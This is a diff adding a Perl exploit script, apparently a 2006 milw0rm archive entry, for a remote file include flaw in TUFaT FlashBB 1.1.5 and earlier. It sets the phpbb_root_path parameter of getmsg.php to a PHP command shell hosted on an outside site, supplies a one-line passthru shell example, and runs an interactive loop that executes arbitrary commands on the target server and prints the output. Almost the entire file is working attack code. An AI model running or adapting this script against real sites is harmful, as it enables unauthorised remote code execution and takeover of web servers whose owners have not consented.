@@ -1,0 +1,88 @@
+#!/usr/bin/perl
+##
+# TUFaT FlashBB <= 1.1.5 (phpbb_root_path) Remote File Include Exploit
+# Bugs found & code By h4ntu aka TeloGanyong 
+# 
+## base on http://www.securityfocus.com/bid/18456/
+# 
+##
+#  http://h4ntu.com (c) 2006
+#
+# usage:
+# perl flashBB.pl <target> <cmd shell location> <cmd shell variable>
+#
+# perl flashBB.pl http://target.com/flashbb http://site.com/cmd.txt cmd
+#
+# cmd shell example: <?passthru($_GET[cmd]);?>
+#
+# cmd shell variable: ($_GET[cmd]);
+##
+# #
+# 
+# Contact: h4ntu #batamhacker@irc.dal.net
+##
+
+use LWP::UserAgent;
+
+$Path = $ARGV[0];
+$Pathtocmd = $ARGV[1];
+$cmdv = $ARGV[2];
+
+if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
+
+head();
+
+while()
+{
+       print "[shell] \$";
+while(<STDIN>)
+       {
+               $cmd=$_;
+               chomp($cmd);
+
+$xpl = LWP::UserAgent->new() or die;
+$req = HTTP::Request->new(GET =>$Path.'phpbb/getmsg.php?phpbb_root_path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
+
+$res = $xpl->request($req);
+$return = $res->content;
+$return =~ tr/[\n]/[....]/;
+
+if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
+
+elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
+       {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
+elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
+
+if($return =~ /(.*)/)
+
+
+{
+       $finreturn = $1;
+       $finreturn=~ tr/[....]/[\n]/;
+       print "\r\n$finreturn\n\r";
+       last;
+}
+
+else {print "[shell] \$";}}}last;
+
+sub head()
+ {
+ print "\n============================================================================\r\n";
+ print " *TUFaT FlashBB <= 1.1.5 phpbb_root_path Remote File Include Exploit*\r\n";
+ print "============================================================================\r\n";
+ }
+sub usage()
+ {
+ head();
+ print " Usage: perl $0 <target> <cmd shell location> <cmd shell variable>\r\n\n";
+ print " <Site> - Full path to TUFaT FlashBB ex: http://www.site.com/ \r\n";
+ print " <cmd shell> - Path to cmd Shell e.g http://site.com/cmd.txt \r\n";
+ print " <cmd variable> - Command variable used in php shell \r\n";
+ print "============================================================================\r\n";
+ print "                           Bug Found by h4ntu \r\n";
+ print "                    www.h4ntu.com #batamhacker irc.dal.net \r\n";
+ print "============================================================================\r\n";
+ exit();
+ }
+
+# milw0rm.com [2006-06-17]
